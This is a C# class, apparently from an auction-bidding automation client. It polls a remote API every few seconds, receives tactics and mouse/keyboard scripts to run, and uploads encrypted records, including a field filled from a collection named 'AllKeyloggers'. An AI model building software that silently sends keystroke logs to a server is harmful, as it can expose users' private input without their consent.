using CLAS.Model.TMs;
using CLAS.Common;
using CLAS.Model.Entities;


using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using CLAS.Model.VMs;
using CLAS.Utils;
using System.Diagnostics;

namespace CASL.Bll
{
    /// <summary>
    /// 负责更新的Manager
    /// </summary>
    public class SynchronizeManager
    {         
        public static readonly object log=new object();
        public static Thread communication;
        private SynchronizeManager() { }
        public static readonly SynchronizeManager instance = new SynchronizeManager();
        /// <summary>
        /// 通信间隔，毫秒
        /// </summary>
        public static int CommunicationSpan = 5000;

        /// <summary>
        /// 脚本最后更新时间
        /// </summary>
        public static DateTime? ScriptLastUpdateTime { get; set; }
        /// <summary>
        ///策略最后更新时间
        /// </summary>
        public static DateTime? TacticsLastUpdateTime { get; set; }

        /// <summary>
        /// 和服务器进行通信，线程方式
        /// </summary>
        public void Synchronizes()
        {

            communication = new Thread(() =>
            {
                while (true)
                {
                    Synchronize();



                    //停止时间
                    Thread.Sleep(CommunicationSpan);

                }
            });
            communication.IsBackground = true;
            communication.Start();
            #region 测试的部分
            //var date = "2016-9-27 22:14:50.600".ToDateTime();//DateTime.Now.AddSeconds(10);
            //var scripts = new List<string>(){
            //      //找图
            //     "0:0180300600C018000003024018030863046077C830000003F99CE00C018010017D070000000FE673803006004005F41C0$-300$0.0.122$13,-300,00b913-000000|00b913-000000|00b93b-000000|4edad8-000000|4eb913-000000|2cb913-000000|a9d23b-000000",
            //      //移动到框
            //     "1:40,-30",
            //      //鼠标双击
            //     "4:",
            //     //输入
            //     "3:700" ,
            //     //移动到加价
            //     "1:155,0",
            //      //鼠标单击
            //     "2:",
            //     //移动到出价
            //     "1:0,100",
            //      //鼠标单击
            //     "2:",
            //};  
            //    result.Add(new CommandTM(date, scripts)); 


            //return result;
            #endregion

        }
        /// <summary>
        /// 单次
        /// </summary>
        public void Synchronize()
        {
            var now = DateTime.Now;
            try
            {
                //一段时间停止更新的逻辑
                if (CommandManager.Tactics.SyncStopTimeBegin.HasValue &&
                    CommandManager.Tactics.SyncStopTimeStop.HasValue)
                {
                    if (CommandManager.Tactics.SyncStopTimeBegin <= now &&
                        now <= CommandManager.Tactics.SyncStopTimeStop.Value)
                    {
                        LogManager.instance.LogFormat("{0}停止进行同步", DateTime.Now);
                        //停止时间
                        Thread.Sleep(CommunicationSpan);
                        return;
                    }
                }

                var clientRequestTM = new ClientRequestTM()
                {
                    ActivationCode = ActivationCodeManager.ActivationCode,
                    ScriptLastUpdateTime = ScriptLastUpdateTime,
                    TacticsLastUpdateTime = TacticsLastUpdateTime,
                    ScriptExecuteRecords = ScriptManager.ScriptExecuteRecords,
                    SendTime = now,
                    KeyDownRecords = CommandManager.AllKeyloggers
                };

                LogManager.instance.LogFormat("{0}进行同步", DateTime.Now);
                //获取服务器的请求
                var serverRequestTM = GetServerReponse(clientRequestTM);

                //将更新记录记录放到最后
                ScriptManager.ScriptExecuteRecordsSended.AddRange(ScriptManager.ScriptExecuteRecords);
                //置空当前更新记录
                ScriptManager.ScriptExecuteRecords.Clear();

                //同步数据
                ExecuteServerReponse(serverRequestTM);

                LogManager.instance.LogFormat("{0}同步完成", DateTime.Now);
            }
            catch (Exception ex)
            {

                LogManager.instance.LogFormat("同步失败,原因:{0}", ex.Message);

            }
        }

        /// <summary>
        /// 获取服务器发出的指令，并且同步数据到服务器
        /// </summary>
        /// <returns></returns>
        private ServerReponseTM GetServerReponse(ClientRequestTM tm)
        {
            var modelStr = DESEncrypt.EncryptModel(tm);
            var s = RequestHelper.HttpPost(SiteUrl.GetApiUrl("Command/Sync"),   modelStr );
            var serverRequestTM = DESEncrypt.DecryptModel<ServerReponseTM>(s);
            return serverRequestTM;
        }
        /// <summary>
        /// 根据服务器指令执行命令
        /// </summary>
        public void ExecuteServerReponse(ServerReponseTM tm)
        {
            if (tm.CommandType != ServerCommandType.None)
            {
                LogManager.instance.Message("发现有数据更新，更新数据中。。。。");
            }
            switch (tm.CommandType)
            {
                    //同步策略
                case ServerCommandType.SynTactics:
                    if (tm.Tactics != null)
                    {
                        CommandManager.Tactics = tm.Tactics;
                    }

                    TacticsLastUpdateTime = tm.SendTime;

                    LogManager.instance.LogFormat("{0}同步完毕策略 {1}", DateTime.Now, tm.Tactics.Id);
                    LogManager.instance.Message("数据更新完毕");
                    if (tm.IsFor51)
                    {
                        CommandManager.IsFor51 = tm.IsFor51;
                        LogManager.instance.Message("当前是51测试版");
                    }
                    break;
                    //同步脚本
                case ServerCommandType.SynScript:
                    if (tm.Scripts != null)
                    {
                        foreach (var script in tm.Scripts)
                        {
                            var scriptTemp = CommandManager.Tactics.Scripts.Where(o => o.ExecuteTime==script.ExecuteTime&&o.ExecuteCondition==script.ExecuteCondition).FirstOrDefault();
                            if (scriptTemp == null)
                            {

                                CommandManager.Tactics.Scripts.Add(script);
                            }
                            else
                            {
                                scriptTemp.Script = script.Script;
                            }
                        }
                    }

                    LogManager.instance.LogFormat("{0}同步完毕脚本，共 {1}个脚本", DateTime.Now, CommandManager.Tactics.Scripts.Count);
                    ScriptLastUpdateTime = tm.SendTime;
                    LogManager.instance.Message("数据更新完毕");
                    break;
            }
         
        }
    }
}
